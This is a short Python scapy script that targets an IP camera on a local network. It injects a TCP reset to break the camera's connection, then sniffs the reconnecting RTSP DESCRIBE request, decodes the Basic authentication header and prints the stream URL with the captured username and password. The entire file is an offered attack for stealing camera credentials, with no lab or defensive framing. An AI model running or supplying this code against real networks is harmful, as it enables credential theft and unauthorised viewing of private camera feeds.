from scapy.all import *
from scapy.all import RTP

from scapy.config import conf
conf.ipv6_enabled = False

import warnings
warnings.filterwarnings("ignore")

import base64

cameraip = "192.168.1.15"

deviceip = "192.168.1.3"

filterbase = "host " + cameraip  + " and tcp"

rst = True
while True: 
    if rst:
        rcvpkt = sniff(count = 1, filter = filterbase)
        if (rcvpkt[0][IP].src == cameraip):
            rcvpkt[TCP].flags = 'R'
            sendp(rcvpkt)
            rst = False
    else:
        rcvpkt = sniff(count = 1, filter = filterbase)
        payload = str(rcvpkt[0][TCP].payload)
        token = None
        url = None
        if "DESCRIBE" in payload:
            if "Authorization: Basic" in payload:
                token = payload.split("Basic ")[1].split("\\r")[0]
                token = base64.b64decode(token).decode("utf-8")
                #print(token)
            if "rtsp" in payload:
                url = payload.split("rtsp://")[1].split("RTSP/")[0]
                #print(url)
            if token != None and url != None:
                print("RTSP URL is: rtsp://{}@{}".format(token, url))
                break